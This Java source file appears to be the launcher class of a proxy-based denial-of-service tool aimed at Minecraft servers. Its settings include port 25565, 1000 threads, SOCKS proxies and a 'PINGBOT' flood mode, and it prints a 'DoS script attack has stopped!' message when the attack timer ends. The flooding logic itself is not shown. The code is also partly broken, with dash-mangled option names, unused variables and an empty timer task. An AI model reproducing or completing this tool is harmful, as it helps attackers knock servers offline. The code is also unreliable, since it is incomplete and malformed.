package ping;

import java.io.DataOutputStream;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import ping.JoinMode;
import ping.Options;
import ping.ProxyManager;
import ping.SocketHttp;

public class Run
{
    private final Options options;
    private final ProxyManager proxies;
    private int connections = -1;
    private int failed = 0;
    private int timed = 0;
    private final JoinMode flood = new JoinMode();

    public Run(Options options, ProxyManager proxies)
    {
        this.options = options;
        this.proxies = proxies;
    }

    public void run()
    {
        String host = this.options.getOption("host", "127.0.0.1");
        int port = this.options.getOption("port", 25565);
        int threads = this.options.getOption("threads", 1000);
        int connections = this.options.getOption("connections--", 977888887);
        int attackTime = this.options.getOption("time", 100);
        int timeout = this.options.getOption("timeout", 2200);
        boolean keepAlive = this.options.getOption("keepAlive---", true);
        String floodName = String.valueOf(this.options.getOption("bottype--", "PINGBOT"));
        boolean removeFailure = this.options.getOption("removeFailure---", true);
        JoinMode.LOOP_AMOUNT = this.options.getOption("l", 700);
        boolean print = this.options.getOption("debug", false);
        boolean socksV4 = this.options.getOption("socks---", true);
        JoinMode.Flood flood = this.flood.findById(String.valueOf(floodName));

        if(flood == null)
        {
            System.exit(1);
            return;
        }

        new Timer().scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run()
            {}
        }, 8000L, 8000L);

        new Thread(() -> {
            try
            {
                Thread.sleep(1000L * (long)attackTime);
            }
            catch (Exception exception)
            {}
            System.out.println("\nDoS script attack has stopped!\n");
            System.exit(-1);
        }).start();
    }
}
